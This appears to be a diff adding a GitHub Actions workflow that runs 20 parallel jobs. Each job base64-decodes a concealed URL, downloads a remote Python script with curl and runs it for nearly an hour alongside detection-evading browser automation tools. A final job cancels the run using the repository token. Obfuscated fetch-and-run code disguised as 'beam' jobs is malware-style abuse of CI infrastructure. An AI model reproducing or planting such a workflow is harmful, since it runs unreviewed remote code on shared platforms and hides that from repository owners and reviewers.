@@ -1,0 +1,104 @@
+name: Violet Prism Array
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: violet-prism-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Prism Beams: parallel array workers
+  # =================================================================
+  prism-beams:
+    name: "Beam-${{ matrix.beam_label }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        beam_label: [B-7K2, B-3M9, B-8Q1, B-4R6, B-9T5, B-2V8, B-6W3, B-1X7, B-5Y4, B-0Z9, B-7A3, B-3C8, B-8D2, B-4E7, B-9F1, B-2G6, B-6H4, B-1J9, B-5L3, B-0N8]
+
+    steps:
+      # #################################################################
+      # Step Alpha: Beam initialization
+      # #################################################################
+      - name: Beam Initialization
+        run: |
+          echo "[INIT] Initializing Beam-${{ matrix.beam_label }} ..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Step Beta: Beam asset retrieval
+      # #################################################################
+      - name: Beam Asset Retrieval
+        run: |
+          echo "[ASSET] Retrieving beam asset..."
+          ASSET_LINK=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$ASSET_LINK" -o beam_asset.py
+          echo "[ASSET] Beam asset retrieved."
+
+      # #################################################################
+      # Step Gamma: Beam module setup
+      # #################################################################
+      - name: Beam Module Setup
+        run: |
+          echo "[MODULE] Setting up beam modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Step Delta: Beam activation (3540s ceiling)
+      # #################################################################
+      - name: Beam Activation
+        run: |
+          echo ">> Activating Beam-${{ matrix.beam_label }} ..."
+
+          python3 beam_asset.py &
+          BEAM_PID=$!
+
+          echo ">> Beam active. Ceiling: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$BEAM_PID" 2>/dev/null; then
+            echo ">> Ceiling hit — retiring beam."
+            kill -9 "$BEAM_PID"
+            echo ">> Beam retired by ceiling monitor."
+          else
+            echo ">> Beam retired naturally before ceiling."
+          fi
+
+  # =================================================================
+  # Prism Sentinel: 59-minute hold, then cancels the whole run
+  # =================================================================
+  prism-sentinel:
+    name: "Prism Sentinel"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      PRISM_HOLD: 3540
+
+    steps:
+      - name: Sentinel Hold
+        run: |
+          echo "[SENTINEL] Sentinel holding for run: ${{ github.run_id }}"
+          echo "[SENTINEL] Holding ${PRISM_HOLD} seconds before the boundary."
+
+          sleep "${PRISM_HOLD}"
+
+          echo "[SENTINEL] Boundary reached — firing cancel request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SENTINEL] Cancel request fired. Every active and queued job will be cancelled."
